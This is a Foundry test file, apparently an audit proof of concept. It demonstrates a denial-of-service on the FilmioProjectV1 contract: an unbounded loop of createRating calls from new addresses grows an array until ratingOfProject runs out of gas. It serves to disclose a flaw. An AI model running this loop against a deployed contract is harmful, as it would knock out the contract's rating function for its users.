// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/StdUtils.sol" ;
import { FilmioProjectV1 } from "src/Project/FilmioProjectV1.sol";

contract PoCDoSRatingOfProject is Test {
    function testPoCDoS() public {
        // Deploy the Contract
        vm.prank(address(1));
        FilmioProjectV1 filmio = new FilmioProjectV1();

        // Initialize
        filmio.initialize(address(2));

        // Create a lock
        string memory projectId = "Foo";
        filmio.createLock(projectId);

        // Add elements to `ratingById` to generate a DoS(out of gas)
        for (uint256 i = 100; true; i++) {
            vm.prank(address(uint160(i)));
            filmio.createRating(projectId, 1);

            // When the `ratingById` array is big enough, it will fail with Reason: EvmError: OutOfGas
            filmio.ratingOfProject(projectId);
        }
    }
}